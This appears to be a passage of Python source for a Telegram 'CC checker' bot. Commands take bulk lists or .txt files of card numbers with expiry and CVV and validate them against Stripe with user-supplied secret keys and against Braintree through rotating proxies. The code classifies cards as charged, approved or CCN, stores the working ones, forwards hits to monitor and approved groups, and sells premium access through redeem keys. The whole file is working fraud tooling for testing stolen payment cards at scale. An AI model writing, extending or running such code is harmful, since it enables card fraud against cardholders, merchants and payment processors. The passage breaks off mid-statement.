async def _mskcvv_check_single(
    cc_str: str, sk: str, pk: str, status_msg: types.Message,
    results: dict, order: list, user_id: int, user_name: str, user_uname: str,
):
    sem = get_user_semaphore(user_id)
    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    async with sem:
        status, msg, code, amount = await _skcvv_execute(sk, pk, cc_str, user_id)
    bin_info = await _bin
    status, msg, code = classify_gate_response(msg, status_hint=status, code_hint=code)
    results[cc_str] = {"status": status, "msg": msg, "code": code, "bin": bin_info, "amount": amount}

    if gate_is_charged(status, code, msg):
        auth.save_charged_cc(cc_str, user_id, user_name, SKCVV_GATE_LABEL, "1")

    msg_id = status_msg.message_id
    if msg_id not in _MSKCVV_EDIT_LOCKS:
        _MSKCVV_EDIT_LOCKS[msg_id] = asyncio.Lock()
    async with _MSKCVV_EDIT_LOCKS[msg_id]:
        done = sum(1 for c in order if c in results)
        lines = [f"{pe(E['bolt'])} {bold(SKCVV_GATE_LABEL)} Mass [{bold(str(done))}/{bold(str(len(order)))}]\n"]
        for cc in order:
            if cc in results:
                e = results[cc]
                sl = _skcvv_status_line(e["status"], e["msg"], e["code"], e.get("amount", ""))
                bi = e["bin"]
                amt = e.get("amount", "")
                amt_line = f"\n{pe(R['price'])} {bold(amt)}" if amt else ""
                lines.append(
                    f"{sl}\n{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold(e['msg'][:80])}{amt_line}\n"
                    f"{pe(R['bin_info'])} {bi['brand']} | {bi['type']} | {bi['flag']} {bi['country']}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> checking...")
        lines.append(f"\n{pe(R['checked_by'])} {user_link(user_id, user_name, user_uname)}")
        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass
        if done >= len(order):
            _MSKCVV_EDIT_LOCKS.pop(msg_id, None)

    if gate_is_charged(status, code, msg):
        try:
            hit = _skcvv_result_text(cc_str, status, msg, code, bin_info, user_id, user_name, user_uname, amount)
            await bot.send_message(auth.MONITOR_GROUP_ID, hit)
        except Exception:
            pass
    elif gate_is_approved(status, code, msg):
        try:
            hit = _skcvv_result_text(cc_str, status, msg, code, bin_info, user_id, user_name, user_uname, amount)
            await _send_approved(hit)
        except Exception:
            pass


@router.message(Command("mskcvv"))
async def cmd_mskcvv(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(f"{pe(E['cross'])} {bold('Premium Access Required!')}")
        return
    if skcvv is None:
        await message.reply(f"{pe(E['cross'])} {bold('SK CVV module not available!')}")
        return

    raw_text = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = (raw_text + "\n" + rt).strip() if raw_text else rt

    sk, pk = _parse_sk_pk(raw_text)
    saved = get_user_skkeys(user_id)
    if not sk or not pk:
        if saved:
            sk, pk = saved
        else:
            await message.reply(
                f"{pe(E['warn'])} {bold('No SK/PK found!')}\n\n"
                f"{pe(E['next'])} /skadd sk_live_xxx pk_live_xxx"
            )
            return

    cleaned = re.sub(r"(?:sk|pk)_(?:live|test)_[A-Za-z0-9]+", " ", raw_text)
    all_ccs = _extract_cc_list(cleaned, MSKCVV_MAX_CCS)
    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)
    init = [f"{pe(E['bolt'])} {bold(SKCVV_GATE_LABEL)} Mass [0/{total}]\n"]
    init += [f"{pe(E['loading'])} <tg-spoiler>{c}</tg-spoiler>" for c in all_ccs]
    init.append(f"\n{pe(R['checked_by'])} {user_link(user_id, user_name, user_uname)}")
    status_msg = await message.reply("\n\n".join(init))
    results: dict = {}
    order = list(all_ccs)
    await asyncio.gather(*[
        asyncio.create_task(
            _mskcvv_check_single(cc, sk, pk, status_msg, results, order, user_id, user_name, user_uname)
        ) for cc in all_ccs
    ], return_exceptions=True)


# ── /sktxt — file check ───────────────────────────────────────────────────────

async def _sktxt_wrap_task(cc_str: str, sk: str, pk: str, user_id: int) -> tuple[str, str, str, str, str]:
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            status, msg, code, amount = await _skcvv_execute(sk, pk, cc_str, user_id)
        except Exception as e:
            status, msg, code, amount = "error", str(e)[:80], "exception", ""
    status, msg, code = classify_gate_response(msg, status_hint=status, code_hint=code)
    return status, msg, code, cc_str, amount


async def _process_sktxt(
    all_ccs: list, sk: str, pk: str,
    user_id: int, user_name: str, user_uname: str,
    chat_id: int, status_msg: types.Message, stop_key: str,
):
    total = len(all_ccs)
    checked, approved, charged_count, declined, skipped = 0, 0, 0, 0, 0
    _start_time = time.time()
    _last_status_edit = 0.0

    try:
        for i in range(0, len(all_ccs), SKTXT_BATCH_SIZE):
            if _SKTXT_STOP_FLAGS.get(stop_key):
                skipped += len(all_ccs) - i - checked
                break

            batch = all_ccs[i:i + SKTXT_BATCH_SIZE]
            wrapped = []
            for cc in batch:
                if _SKTXT_STOP_FLAGS.get(stop_key):
                    break
                wrapped.append(_sktxt_wrap_task(cc, sk, pk, user_id))

            if not wrapped:
                continue

            for fut in asyncio.as_completed(wrapped):
                status, msg, code, cc, amount = await fut
                if _SKTXT_STOP_FLAGS.get(stop_key):
                    skipped += 1
                    continue

                checked += 1
                is_charged = gate_is_charged(status, code, msg)
                is_approved = gate_is_approved(status, code, msg)
                should_send = False

                if is_charged:
                    charged_count += 1
                    approved += 1
                    should_send = True
                elif is_approved:
                    approved += 1
                    should_send = True
                else:
                    declined += 1

                if should_send:
                    bin_num = cc.split("|")[0][:6]
                    try:
                        bin_info = await asyncio.wait_for(bin_lookup(bin_num), timeout=15.0)
                    except asyncio.TimeoutError:
                        bin_info = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                    hit_text = _skcvv_result_text(
                        cc, status, msg, code, bin_info, user_id, user_name, user_uname, amount,
                    )
                    try:
                        sent_msg = await bot.send_message(chat_id, hit_text)
                        if is_charged:
                            auth.save_charged_cc(cc, user_id, user_name, SKCVV_GATE_LABEL, "1")
                            try:
                                await bot.pin_chat_message(chat_id, sent_msg.message_id, disable_notification=True)
                            except Exception:
                                pass
                            try:
                                await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
                            except Exception:
                                pass
                        else:
                            await _send_approved(hit_text)
                    except Exception:
                        pass

                _now = time.time()
                if _now - _last_status_edit >= 3 or (checked + skipped) >= total:
                    _last_status_edit = _now
                    stop_btn = {
                        "inline_keyboard": [[{
                            "text": f"{bold('Stop Checking')}",
                            "callback_data": f"sktxt_stop:{stop_key}",
                            "icon_custom_emoji_id": E["stop"],
                            "style": "danger",
                        }]]
                    }
                    progress_text = (
                        f"{pe(E['rocket'])} {bold(SKCVV_GATE_LABEL)} {bold('File Check')}\n\n"
                        f"{pe(E['bolt'])} {bold('Response:')} {_gate_msg_display(msg, 60)}\n"
                        f"{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n\n"
                        f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(checked + skipped))}/{bold(str(total))}\n"
                        f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged_count))}\n"
                        f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
                        f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                        f"{pe(E['hourglass'])} {bold('Remaining:')} {bold(str(total - checked - skipped))}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    try:
                        if (checked + skipped) >= total:
                            await safe_edit(status_msg, progress_text)
                        else:
                            await safe_edit(status_msg, progress_text, reply_markup=stop_btn)
                    except Exception:
                        pass
    finally:
        _SKTXT_STOP_FLAGS.pop(stop_key, None)

    _elapsed = int(time.time() - _start_time)
    _elapsed_str = f"{_elapsed // 60}m {_elapsed % 60}s" if _elapsed >= 60 else f"{_elapsed}s"
    try:
        await safe_edit(status_msg,
            f"{pe(E['check'])} {bold(SKCVV_GATE_LABEL)} {bold('File Check Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged_count))}\n"
            f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
            f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
            f"{pe(E['warn'])} {bold('Skipped:')} {bold(str(skipped))}\n"
            f"{pe(E['hourglass'])} {bold('Time:')} {bold(_elapsed_str)}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
        )
    except Exception:
        pass


@router.message(Command("sktxt"))
async def cmd_sktxt(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return
    if skcvv is None:
        await message.reply(f"{pe(E['cross'])} {bold('SK CVV module not available!')}")
        return

    keys = get_user_skkeys(user_id)
    if not keys:
        await message.reply(
            f"{pe(E['warn'])} {bold('No SK/PK saved!')}\n\n"
            f"{pe(E['next'])} /skadd sk_live_xxx pk_live_xxx\n"
            f"{pe(E['next'])} {bold('Then reply to a .txt with')} /sktxt"
        )
        return
    sk, pk = keys

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /sktxt\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return
    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(f"{pe(E['cross'])} {bold('Only .txt files are supported!')}")
        return

    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to download file!')}")
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}")
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} {bold(str(cc_limit))} {bold('CCs max for your plan.')}\n"
            f"{pe(E['next'])} {bold('Extra CCs skipped.')}"
        )

    if user_id in _SKTXT_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your file check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to finish or tap')} {bold('Stop Checking')} {bold('first.')}"
        )
        return

    stop_key = f"{message.chat.id}:{user_id}"
    _SKTXT_STOP_FLAGS[stop_key] = False
    _SKTXT_ACTIVE_USERS.add(user_id)
    total = len(all_ccs)
    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"sktxt_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }
        status_msg = await message.reply(
            f"{pe(E['rocket'])} {bold(SKCVV_GATE_LABEL)} {bold('File Check Started!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(SKTXT_BATCH_SIZE))}\n"
            f"{pe(E['refresh'])} {bold('Direct Stripe API (no proxy)')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )
        await _process_sktxt(
            all_ccs, sk, pk, user_id, user_name, user_uname,
            message.chat.id, status_msg, stop_key,
        )
    finally:
        _SKTXT_ACTIVE_USERS.discard(user_id)


@router.callback_query(F.data.startswith("sktxt_stop:"))
async def cb_sktxt_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    try:
        owner_id = int(stop_key.split(":")[-1])
    except (ValueError, IndexError):
        owner_id = 0
    if callback.from_user.id != owner_id and not auth.is_admin(callback.from_user.id):
        await callback.answer(bold("Only owner can stop"), show_alert=True)
        return
    _SKTXT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping..."), show_alert=False)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  BRAINTREE AUTH GATE  /br  /mbr  /brtxt
# ══════════════════════════════════════════════════════════════════════════════

MBR_MAX_CCS  = 10
BRTXT_BATCH  = 5

_MBR_EDIT_LOCKS:  dict[int, asyncio.Lock] = {}
_BRTXT_STOP_FLAGS: dict[str, bool] = {}
_BRTXT_ACTIVE_USERS: set[int] = set()


# ── Helpers ───────────────────────────────────────────────────────────────────

def _br_status_line(status: str, msg: str, code: str) -> str:
    if code == "cvv_approved" or status == "approved":
        return f"{pe(E['gem'])} {bold('CVV Approved — Card Added!')}"
    if code == "ccn" or status == "ccn":
        return f"{pe(E['check2'])} {bold('CCN — Card Number Valid!')}"
    if code in ("proxy_error", "connection_error"):
        return f"{pe(E['warn'])} {bold('Proxy / Connection Error')}"
    if status == "declined":
        return f"{pe(E['cross'])} {bold('Declined')}"
    return f"{pe(E['warn2'])} {bold(msg[:60])}"


def _br_run_check(cc_str: str, proxy_list: list, max_retries: int = 1) -> tuple[str, str, str]:
    """Sync wrapper — runs b3auth.b3_check_card with proxy rotation."""
    parts = cc_str.split("|")
    if len(parts) < 4:
        return "error", "Invalid CC format", "bad_format"
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

    last_status, last_msg, last_code = "error", "All retries failed", "failed"
    tried_proxies: set[int] = set()

    for attempt in range(max_retries + 1):
        available = [p for p in proxy_list if id(p) not in tried_proxies]
        if not available:
            available = proxy_list
        proxy_data = random.choice(available) if available else None
        if proxy_data:
            tried_proxies.add(id(proxy_data))
        proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None

        try:
            status, msg, code = b3auth.b3_check_card(cc, mm, yy, cvv, proxy_url=proxy_url)
        except Exception as e:
            last_msg  = str(e)[:80]
            last_code = "exception"
            continue

        last_status, last_msg, last_code = status, msg, code

        if code in ("proxy_error", "connection_error") and attempt < max_retries:
            continue
        return status, msg, code

    return last_status, last_msg, last_code


# ── /br — single check (all premium users) ────────────────────────────────────

@router.message(Command("br"))
async def cmd_br(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    # ── Antispam cooldown ─────────────────────────────────────────────────────
    remaining = check_cooldown(user_id)
    if remaining > 0:
        await message.reply(
            f"{pe(E['warn'])} {bold('Slow down!')} Please wait {bold(f'{remaining:.0f}s')} before next check."
        )
        return

    # ── Extract CC ─────────────────────────────────────────────────────────────
    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /br 4111111111111111|01|2030|123\n"
            f"{pe(E['next'])} {bold('Or reply to a message containing a CC.')}"
        )
        return

    # ── Proxy check ────────────────────────────────────────────────────────────
    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    # ── Set antispam cooldown ────────────────────────────────────────────────
    set_cooldown(user_id)

    bin_num = cc_str.split("|")[0][:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Gate:')} {bold('Braintree Auth')}\n"
        f"{pe(E['hourglass'])} {bold('Processing...')}"
    )

    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem  = get_user_semaphore(user_id)
    async with sem:
        try:
            status, msg, code = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _br_run_check(cc_str, proxy_list),
            )
        except Exception as e:
            status, msg, code = "error", str(e)[:80], "exception"
    bin_info = await _bin

    sl = _br_status_line(status, msg, code)
    result_text = (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold('Braintree Auth')}\n"
        f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:120])}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} "
        f"{user_link(message.from_user.id, message.from_user.full_name, message.from_user.username)}"
    )

    await safe_edit(loading_msg, result_text)

    if status == "approved":
        auth.save_charged_cc(
            cc_str, user_id,
            message.from_user.full_name or "Unknown",
            "Braintree Auth", "-",
        )
        try:
            await bot.pin_chat_message(
                message.chat.id, loading_msg.message_id, disable_notification=True,
            )
        except Exception:
            pass
        await _send_approved(result_text)
    elif status == "ccn":
        await _send_approved(result_text)


# ── /mbr — mass Braintree check (owner only) ─────────────────────────────────

async def _mbr_check_single(
    cc_str: str, proxy_list: list,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    sem  = get_user_semaphore(user_id)
    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    async with sem:
        try:
            status, msg, code = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _br_run_check(cc_str, proxy_list),
            )
        except Exception as e:
            status, msg, code = "error", str(e)[:80], "exception"

    bin_info = await _bin
    results[cc_str] = {"status": status, "msg": msg, "code": code, "bin": bin_info}

    if status == "approved":
        auth.save_charged_cc(cc_str, user_id, user_name, "Braintree Auth", "-")

    msg_id = status_msg.message_id
    if msg_id not in _MBR_EDIT_LOCKS:
        _MBR_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _MBR_EDIT_LOCKS[msg_id]:
        done  = sum(1 for cc in order if cc in results)
        total = len(order)
        lines = [f"{pe(E['bolt'])} {bold('B3 Mass Check')} [{bold(str(done))}/{bold(str(total))}]\n"]

        for cc in order:
            if cc in results:
                e  = results[cc]
                sl = _br_status_line(e["status"], e["msg"], e["code"])
                bi = e["bin"]
                bin_line = (
                    f"{bi['brand']} | {bi['type']} | {bi['level']} | "
                    f"{bi['bank']} | {bi['flag']} {bi['country']}"
                )
                lines.append(
                    f"{sl}\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('Braintree Auth')}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}\n"
                    f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")

        lines.append(
            f"\n{pe(R['checked_by'])} {bold('Checked by:')} "
            f"{user_link(user_id, user_name, user_uname)}"
        )
        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if done == total:
        _MBR_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("mbr"))
async def cmd_mbr(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.is_owner(user_id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Owner Only Command!')}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('No CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /mbr then paste up to {MBR_MAX_CCS} CCs\n"
            f"{pe(E['next'])} {bold('One per line:')} cc|mm|yy|cvv"
        )
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in raw_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return

    all_ccs = all_ccs[:MBR_MAX_CCS]

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    user_name  = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total      = len(all_ccs)

    init_lines = [f"{pe(E['bolt'])} {bold('B3 Mass Check')} [{bold('0')}/{bold(str(total))}]\n"]
    for cc in all_ccs:
        init_lines.append(
            f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}"
        )
    init_lines.append(
        f"\n{pe(R['checked_by'])} {bold('Checked by:')} "
        f"{user_link(user_id, user_name, user_uname)}"
    )
    status_msg = await message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(all_ccs)
    tasks = [
        asyncio.create_task(
            _mbr_check_single(
                cc, proxy_list, status_msg, results, order,
                user_name, user_uname, user_id,
            )
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    # Post-check: pin approved, send CCN to approved group
    _mbr_approved_sent = False
    for cc in order:
        if cc not in results:
            continue
        e = results[cc]
        if e["status"] == "approved" and not _mbr_approved_sent:
            _mbr_approved_sent = True
            try:
                await bot.pin_chat_message(
                    message.chat.id, status_msg.message_id, disable_notification=True,
                )
            except Exception:
                pass
        if e["status"] in ("approved", "ccn"):
            try:
                bi = e["bin"]
                bin_line = (
                    f"{bi['brand']} | {bi['type']} | {bi['level']} | "
                    f"{bi['bank']} | {bi['flag']} {bi['country']}"
                )
                hit_text = (
                    f"{_br_status_line(e['status'], e['msg'], e['code'])}\n\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('Braintree Auth')}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}\n"
                    f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}\n\n"
                    f"{pe(R['checked_by'])} {bold('Checked by:')} "
                    f"{user_link(user_id, user_name, user_uname)}"
                )
                await _send_approved(hit_text)
            except Exception:
                pass


# ── /brtxt — file batch check (owner only) ───────────────────────────────────

async def _process_brtxt(
    all_ccs: list[str],
    user_id: int, user_name: str, user_uname: str,
    chat_id: int, status_msg: types.Message,
    stop_key: str, proxy_list: list,
):
    total = len(all_ccs)
    checked = approved = ccn_count = declined = skipped = 0
    _start  = time.time()
    _last_edit = 0.0

    async def _wrap(cc: str):
        """Return (status, msg, code, cc) so as_completed callers know which cc completed."""
        sem = get_user_semaphore(user_id)
        async with sem:
            try:
                status, msg, code = await asyncio.get_running_loop().run_in_executor(
                    CHECKER_POOL, lambda: _br_run_check(cc, proxy_list),
                )
            except Exception as e:
                status, msg, code = "error", str(e)[:80], "exception"
        return status, msg, code, cc

    try:
        for i in range(0, total, BRTXT_BATCH):
            if _BRTXT_STOP_FLAGS.get(stop_key):
                skipped += total - i
                break

            batch = all_ccs[i:i + BRTXT_BATCH]
            wrapped = [
                asyncio.create_task(_wrap(cc))
                for cc in batch
                if not _BRTXT_STOP_FLAGS.get(stop_key)
            ]
            if not wrapped:
                continue

            for fut in asyncio.as_completed(wrapped):
                status, msg, code, cc = await fut
                if _BRTXT_STOP_FLAGS.get(stop_key):
                    skipped += 1
                    continue

                checked += 1

                is_approved = status == "approved"
                is_ccn      = status == "ccn"
                is_declined = status in ("declined", "error")

                should_send = is_approved or is_ccn
                if is_approved:
                    approved += 1
                    auth.save_charged_cc(cc, user_id, user_name, "Braintree Auth", "-")
                elif is_ccn:
                    ccn_count += 1
                    approved  += 1
                else:
                    declined += 1

                if should_send:
                    bin_num  = cc.split("|")[0][:6]
                    bin_info = await bin_lookup(bin_num)
                    sl       = _br_status_line(status, msg, code)
                    hit_text = (
                        f"{sl}\n\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(R['gate'])} {bold('Gate:')} {bold('Braintree Auth')}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:100])}\n\n"
                        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
                        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
                        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
                        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
                        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
                        f"{pe(R['country'])} {bold('Country:')} "
                        f"{bin_info['flag']} {bold(bin_info['country'])}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} "
                        f"{user_link(user_id, user_name, user_uname)}"
                    )
                    try:
                        sent = await bot.send_message(chat_id, hit_text)
                        if is_approved:
                            try:
                                await bot.pin_chat_message(
                                    chat_id, sent.message_id, disable_notification=True,
                                )
                            except Exception:
                                pass
                        await _send_approved(hit_text)
                    except Exception:
                        pass

                _now = time.time()
                if _now - _last_edit >= 3 or (checked + skipped) >= total:
                    _last_edit = _now
                    stop_btn = {
                        "inline_keyboard": [[{
                            "text": "🛑 Stop Checking",
                            "callback_data": f"brtxt_stop:{stop_key}",
                        }]]
                    }
                    progress = (
                        f"{pe(E['rocket'])} {bold('B3 File Check')}\n\n"
                        f"{pe(E['bolt'])} {bold('Last:')} {bold(msg[:60])}\n"
                        f"{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n\n"
                        f"{pe(E['bolt'])} {bold('Progress:')} "
                        f"{bold(str(checked + skipped))}/{bold(str(total))}\n"
                        f"{pe(E['gem'])} {bold('Approved:')} {bold(str(approved))}\n"
                        f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                        f"{pe(E['hourglass'])} {bold('Remaining:')} "
                        f"{bold(str(total - checked - skipped))}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} "
                        f"{user_link(user_id, user_name, user_uname)}"
                    )
                    try:
                        if (checked + skipped) >= total:
                            await safe_edit(status_msg, progress)
                        else:
                            await safe_edit(status_msg, progress, reply_markup=stop_btn)
                    except Exception:
                        pass

    finally:
        _BRTXT_STOP_FLAGS.pop(stop_key, None)

    elapsed = int(time.time() - _start)
    elapsed_str = f"{elapsed // 60}m {elapsed % 60}s" if elapsed >= 60 else f"{elapsed}s"
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold('B3 File Check Complete!')}\n\n"
